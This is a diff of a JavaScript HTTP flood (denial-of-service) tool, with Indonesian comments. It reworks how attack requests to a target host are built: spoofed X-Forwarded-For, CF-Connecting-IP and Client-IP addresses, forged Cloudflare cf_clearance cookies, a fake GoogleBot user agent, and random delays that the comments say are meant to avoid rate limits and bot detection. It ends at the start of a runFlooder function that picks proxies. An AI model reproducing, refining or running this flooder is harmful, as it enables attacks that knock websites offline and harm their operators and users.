@@ -3259,122 +3259,128 @@ const cplist = [
  }
  }
 
- const rateHeaders = [
-    { "akamai-origin-hop": randstr(5)  },
-    { "source-ip": randstr(5)  },
-    { "via": randstr(5)  },
-    { "cluster-ip": randstr(5)  },
-    {"Access-Control-Request-Method": "GET", randomMethod},
-    {"dnt" : "1" },
-    ];
-    const rateHeaders2 = [
-    { "akamai-origin-hop": randstr(5)  },
-    { "source-ip": randstr(5)  },
-    { "via": randstr(5)  },
-    { "cluster-ip": randstr(5)  },
-    ];
+ function randstr(length) {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+function randIP() {
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+}
+
+const rateHeaders = [
+    { "akamai-origin-hop": randstr(5) },
+    { "source-ip": randIP() },
+    { "via": randstr(5) },
+    { "cluster-ip": randIP() },
+    { "Access-Control-Request-Method": "GET" },
+    { "dnt": "1" },
+    { "X-Forwarded-For": randIP() },
+    { "Referer": `https://${randstr(8)}.com` },
+    { "User-Agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 10 + 90)}.0.0.0 Safari/537.36` }
+];
+
+const rateHeaders2 = [
+    { "akamai-origin-hop": randstr(5) },
+    { "source-ip": randIP() },
+    { "via": randstr(5) },
+    { "cluster-ip": randIP() },
+    { "X-Forwarded-For": randIP() }
+];
+
+// Fungsi untuk menunggu secara acak untuk menghindari rate limit
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function sendRequest(url) {
+    try {
+        const response = await fetch(url, {
+            method: "GET",
+            headers: Object.assign({}, ...rateHeaders)
+        });
+
+        //console.log(`Status: ${response.status}`);
+
+        // Delay acak untuk menghindari deteksi bot
+        await delay(Math.random() * 3000 + 1000);
+    } catch (error) {
+        //console.error("Request error:", error);
+    }
+}
 
  const Socker = new NetSocket();
- headers[":method"] = "GET";
+headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers["x-forwarded-proto"] = "https";
-headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
 headers[":scheme"] = "https";
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
-headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+
+// Menggunakan path yang benar tanpa ditimpa berkali-kali
 headers[":path"] = parsedTarget.path + "?" + randstr(6) + "=" + randstr(15);
-headers[":authority"] = parsedTarget.host;
+
+// Header standar
 headers["origin"] = parsedTarget.host;
-headers["Content-Type"] = randomHeaders['Content-Type'];
-headers[":scheme"] = "https";
-headers["x-download-options"] = randomHeaders['x-download-options'];
-headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
-headers["X-Forwarded-For"] = spoofed;
-headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
-headers["accept"] = randomHeaders['accept'];
-headers["accept"] = randomHeaders['accept'];
-headers["accept"] = accept;
-headers["accept-language"] = randomHeaders['accept-language'];
-headers["accept-language"] = lang;
-headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
+headers["Content-Type"] = randomHeaders["Content-Type"];
+headers["x-download-options"] = randomHeaders["x-download-options"];
+headers["Cross-Origin-Embedder-Policy"] = randomHeaders["Cross-Origin-Embedder-Policy"];
+headers["Cross-Origin-Opener-Policy"] = randomHeaders["Cross-Origin-Opener-Policy"];
+headers["Referrer-Policy"] = randomHeaders["Referrer-Policy"];
 headers["referer"] = Ref;
-headers["x-cache"] = randomHeaders['x-cache'];
-headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
-headers["accept-encoding"] = randomHeaders['accept-encoding'];
-headers["accept-encoding"] = encoding;
-headers["cache-control"] = randomHeaders['cache-control'];
-headers["x-frame-options"] = randomHeaders['x-frame-options'];
-headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
+headers["x-cache"] = randomHeaders["x-cache"];
+headers["Content-Security-Policy"] = randomHeaders["Content-Security-Policy"];
+headers["cache-control"] = "no-cache";
+headers["pragma"] = randomHeaders["pragma"];
+
+// Header keamanan
+headers["strict-transport-security"] = randomHeaders["strict-transport-security"];
+headers["x-frame-options"] = randomHeaders["x-frame-options"];
+headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
 headers["x-content-type-options"] = "nosniff";
+
+// Header spoofing & proxy
 headers["X-Forwarded-For"] = spoofed;
-headers["TE"] = "trailers";
-headers["pragma"] = randomHeaders['pragma'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["upgrade-insecure-requests"] = "1";
-headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
-headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
-headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
-headers["X-Forwarded-Proto"] = HTTPS;
-headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
-headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = pl;
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["upgrade-insecure-requests"] = "1";
-headers["vary"] = randomHeaders['vary'];
-headers["x-requested-with"] = "XMLHttpRequest";
-headers["TE"] = trailers;
-headers["set-cookie"] = randomHeaders['set-cookie'];
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15)
-headers["Server"] = randomHeaders['Server'];
-headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
-headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
-headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
-headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
-headers["alt-svc"] = randomHeaders['alt-svc'];
-headers["Via"] = fakeIP;
-headers["sss"] = fakeIP;
-headers["Sec-Websocket-Key"] = fakeIP;
-headers["Sec-Websocket-Version"] = 13;
-headers["Upgrade"] = websocket;
-headers["X-Forwarded-For"] = fakeIP;
+headers["X-Forwarded-Proto"] = "https";
 headers["X-Forwarded-Host"] = fakeIP;
 headers["Client-IP"] = fakeIP;
 headers["Real-IP"] = fakeIP;
-headers["Referer"] = randomReferer;
-headers["User-Agent"] = randomHeaders['User-Agent'];
-headers["user-agent"] = uap;
-headers["User-Agent"] = uap;
 headers["CF-Connecting-IP"] = fakeIP;
 headers["CF-RAY"] = "randomRayValue";
 headers["CF-Visitor"] = "{'scheme':'https'}";
-headers["X-Forwarded-For"] = spoofed
-headers["X-Forwarded-For"] = spoofed
-headers["X-Forwarded-For"] = spoofed
-headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
-headers[":scheme"] = "https";
-headers["x-forwarded-proto"] = "https";
-headers["cache-control"] = "no-cache";
-headers["X-Forwarded-For"] = spoofed;
-headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
-headers["sec-ch-ua-mobile"] = "?0";
-headers["sec-ch-ua-platform"] = "Windows";
+headers["Via"] = fakeIP;
+
+// Header User-Agent dan Accept
+headers["User-Agent"] = uap;
+headers["accept"] = accept;
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
-headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept;
-headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
-headers["referer"] = Ref;
-headers["sec-fetch-mode"] = "navigate"; 
-headers["sec-fetch-dest"] = dest1;
+
+// Header terkait WebSocket
+headers["Sec-Websocket-Key"] = fakeIP;
+headers["Sec-Websocket-Version"] = "13";
+headers["Upgrade"] = "websocket";
+
+// Header keamanan tambahan
+headers["sec-fetch-dest"] = randomHeaders["sec-fetch-dest"];
+headers["sec-fetch-mode"] = randomHeaders["sec-fetch-mode"];
+headers["sec-fetch-site"] = randomHeaders["sec-fetch-site"];
 headers["sec-fetch-user"] = "?1";
-headers["TE"] = "trailers";
-headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
-headers["sec-fetch-site"] = site1;
+headers["sec-ch-ua"] = randomHeaders["sec-ch-ua"];
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = "Windows";
+
+// Header lainnya
+headers["set-cookie"] = randomHeaders["set-cookie"];
+headers["cookie"] = 
+  "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + 
+  "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
 headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = "trailers";
+headers["vary"] = randomHeaders["vary"];
+headers["alt-svc"] = randomHeaders["alt-svc"];
 
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
